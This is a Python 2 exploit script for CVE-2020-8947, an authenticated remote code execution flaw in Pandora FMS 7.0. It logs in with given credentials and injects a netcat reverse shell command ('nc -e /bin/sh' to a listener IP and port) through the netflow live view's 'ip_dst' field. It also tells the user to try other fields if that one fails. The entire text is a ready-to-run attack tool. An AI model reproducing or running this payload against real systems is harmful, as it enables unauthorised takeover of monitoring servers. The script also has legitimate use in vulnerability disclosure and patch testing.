# Exploit Author: Engin Demirbilek
# Vendor homepage: http://pandorafms.org/
# Version: 7.0
# Software link: https://pandorafms.org/features/free-download-monitoring-software/
# Tested on: CentOS
# CVE: CVE-2020-8947

#!/bin/python
&#039;&#039;&#039;
PANDORAFMS 7.0 Authenticated Remote Code Execution x4
This exploits can be edited to exploit 4x Authenticated RCE vulnerabilities exist on PANDORAFMS.
incase default vulnerable variable won&#039;t work, change the position of payload to  one of the following ip_src, dst_port, src_port

Author: Engin Demirbilek
Github: github.com/EnginDemirbilek
CVE: CVE-2020-8947

&#039;&#039;&#039;
import requests
import sys

if len(sys.argv) < 6:
	print "Usage: ./exploit.py http://url username password listenerIP listenerPort"
	exit()

url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
payload = &#039;";nc -e /bin/sh &#039; + sys.argv[4] + &#039; &#039; + sys.argv[5] + &#039; &#039; + &#039;#&#039;

login = {
	&#039;nick&#039;:user,
	&#039;pass&#039;:password,
	&#039;login_button&#039;:&#039;Login&#039;
}
req = requests.Session()
print "Sendin login request ..."
login = req.post(url+"/pandora_console/index.php?login=1", data=login)

payload = {
	&#039;date&#039;:"",
	&#039;time&#039;:"",
	&#039;period&#039;:"",
	&#039;interval_length&#039;:"",
	&#039;chart_type&#039;:"",
	&#039;max_aggregates&#039;:"1",
        &#039;address_resolution&#039;:"0",
        &#039;name&#039;:"",
        &#039;assign_group&#039;:"0",
        &#039;filter_type&#039;:"0",
        &#039;filter_id&#039;:"0",
        &#039;filter_selected&#039;:"0",
        &#039;ip_dst&#039;:payload,
	&#039;ip_src&#039;:"",
	&#039;dst_port&#039;:"",
	&#039;src_port&#039;:"",
	&#039;advanced_filter&#039;:"",
	&#039;aggregate&#039;:"dstip",
	&#039;router_ip&#039;:"",
	&#039;output&#039;:"bytes",
	&#039;draw_button&#039;:"Draw"
}

print "[+] Sendin exploit ..."

exploit = req.post(url+"/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0",cookies=req.cookies, data=payload, headers={
&#039;User-Agent&#039;:&#039;Mozilla/5.0 Gecko/20100101 Firefox/72.0&#039;,
&#039;Accept&#039;:&#039;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#039;,
&#039;Accept-Encoding&#039;:&#039;gzip, deflate&#039;,
&#039;Content-Type&#039;:&#039;application/x-www-form-urlencoded&#039;})

if exploit.status_code == 200:
	print "[+] Everything seems ok, check your listener. If no connection established, change position of payload to ip_src, dst_port or src_port."
else:
	print "[-] Couldn&#039;t send the HTTP request, try again."

